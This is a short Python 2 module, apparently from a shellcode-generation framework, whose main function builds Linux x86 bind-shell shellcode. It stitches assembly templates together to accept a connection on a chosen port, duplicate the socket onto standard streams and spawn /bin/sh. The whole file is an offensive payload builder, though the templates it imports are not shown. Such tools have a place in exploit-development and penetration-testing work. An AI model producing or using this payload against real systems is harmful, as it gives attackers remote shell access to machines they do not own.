from core import *

def main(port):
    """Args: port
    Spawns /bin/sh and binds it to a socket."""
    try:
        port = int(port)
    except:
        print 'Port must be an integer (base 10)'
        exit(0)
    return \
        template('linux/accept.asm', {'port': htons(port)}) + \
        asm('xchg ebx, eax') + \
        template('linux/dup.asm') + \
        template('linux/sh.asm')
